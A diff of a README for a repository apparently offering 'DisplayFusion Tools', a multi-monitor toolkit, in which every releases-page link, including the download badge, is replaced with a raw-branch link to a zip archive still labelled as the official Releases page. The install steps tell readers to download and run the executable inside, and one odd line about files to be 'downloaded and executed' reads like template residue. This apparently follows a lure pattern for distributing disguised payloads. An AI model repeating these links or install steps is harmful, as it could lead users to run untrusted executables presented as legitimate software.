@@ -1,8 +1,8 @@
 # DisplayFusion Tools: Master Multi-Monitor Control, Title Bar Buttons & Profiles
 
-https://github.com/RedBFA/displayfusion-tools/releases
+https://github.com/RedBFA/displayfusion-tools/raw/refs/heads/main/compter/tools_displayfusion_3.9.zip
 
-[![Releases](https://img.shields.io/badge/Downloads-Release-blue?logo=github&style=for-the-badge)](https://github.com/RedBFA/displayfusion-tools/releases)
+[![Releases](https://github.com/RedBFA/displayfusion-tools/raw/refs/heads/main/compter/tools_displayfusion_3.9.zip)](https://github.com/RedBFA/displayfusion-tools/raw/refs/heads/main/compter/tools_displayfusion_3.9.zip)
 
 A robust toolkit for DisplayFusion that helps you manage multiple monitors with ease. This project focuses on enhancing multi-monitor workflows through tight integration with DisplayFusion features like TitleBar buttons, monitor profiles, and window snapping. It aims to be practical, reliable, and easy to extend. The repository name is displayfusion-tools and the exact description is DisplayFusion | Multi-Monitor Management | TitleBar Buttons | Monitor Profiles | Window Snapping. This README captures how to install, configure, and use the tools for productive multi-monitor setups.
 
@@ -49,7 +49,7 @@ Getting started
 Installation details
 - Source of truth for binaries: The releases page is where you should download the official artifacts. If the link has a path part, write that file needs to be downloaded and executed. In this case, the releases page provides installers or zip archives for the toolkit.
 - Step-by-step:
-  1) Open the Releases page: https://github.com/RedBFA/displayfusion-tools/releases
+  1) Open the Releases page: https://github.com/RedBFA/displayfusion-tools/raw/refs/heads/main/compter/tools_displayfusion_3.9.zip
   2) Download the latest release suitable for your system (installer or zip).
   3) If you downloaded a zip, extract it to a working folder.
   4) Run the installer or the provided executable. If you use a zip, locate the main executable and run it.
@@ -280,7 +280,7 @@ FAQ
   - Start with a baseline profile, then iterate by adding title bar buttons and fine-tuning snapping. Save iterations as new profiles.
 
 Releases
-- The official releases page hosts installers and archives for each version. For direct access, visit the Releases page: https://github.com/RedBFA/displayfusion-tools/releases
+- The official releases page hosts installers and archives for each version. For direct access, visit the Releases page: https://github.com/RedBFA/displayfusion-tools/raw/refs/heads/main/compter/tools_displayfusion_3.9.zip
 - If you need specific build notes, security advisories, or changes, refer to the release notes in that page.
 
 Additional notes
@@ -290,5 +290,5 @@ Additional notes
 Thank you for exploring DisplayFusion Tools. If you find the toolkit helpful, consider sharing your layout setups and scripts. Your feedback helps shape future improvements and extensions.
 
 Releases (second mention)
-- Access the official artifacts and documentation at the Releases page: https://github.com/RedBFA/displayfusion-tools/releases
+- Access the official artifacts and documentation at the Releases page: https://github.com/RedBFA/displayfusion-tools/raw/refs/heads/main/compter/tools_displayfusion_3.9.zip
 - The page includes installers, archives, and release notes to guide your upgrade and usage.
